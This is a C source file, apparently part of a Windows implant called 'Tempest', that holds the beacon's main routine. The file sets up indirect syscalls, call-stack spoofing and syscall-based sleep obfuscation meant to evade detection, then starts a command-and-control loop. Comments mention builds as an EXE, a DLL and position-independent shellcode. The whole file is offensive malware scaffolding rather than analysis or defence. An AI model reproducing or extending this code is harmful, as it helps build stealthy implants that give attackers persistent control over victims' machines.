/*
 * Tempest win-stargate — shared implant logic (B.3+ wire C2, hash-only resolve, W^X).
 * Linked into exe, DLL, and future single-blob / PIC targets.
 */
#include <windows.h>
#include <stdio.h>
#include "stargate.h"
#include "bm_spoof.h"
#include "beacon_core.h"
#if !defined(TEMPEST_PIC_SHELLCODE)
#include "morpheus.h"
#include "tempest_c2.h"
#endif

void tempest_beacon_run(void)
{
    SgConfig cfg = { .mode = SG_INDIRECT };
    if (sg_init(&cfg) != 0) {
        fputs("[tempest] FATAL: sg_init failed — C2 not started\n", stderr);
        fflush(stderr);
        return;
    }
    if (bm_spoof_init() != 0) {
        /* Continue without stack spoofing if gadget scan fails. */
    }

#if !defined(TEMPEST_PIC_SHELLCODE) && defined(TS_SERVER)
    /* BM-T6001: Morpheus sleep — direct NT syscalls, no kernel32 Sleep. */
    morpheus_config_t mcfg = MORPHEUS_CONFIG_DEFAULT;
    /* Disable page guard: CRT + stderr / trace use .text; only safe when no-CRT. */
    mcfg.enable_page_guard = FALSE;
    morpheus_ctx_t *mctx = NULL;
    if (morpheus_init(&mcfg, &mctx) != MORPHEUS_OK) {
        fputs("[tempest] FATAL: morpheus_init (BM-T6001) failed\n", stderr);
        fflush(stderr);
        bm_spoof_cleanup();
        sg_cleanup();
        return;
    }
    fputs("[tempest] entering C2 (stderr: [tempest c2] trace)\n", stderr);
    fflush(stderr);
    tempest_c2_run(mctx);
    morpheus_cleanup(mctx);
#endif

    bm_spoof_cleanup();
    sg_cleanup();
}
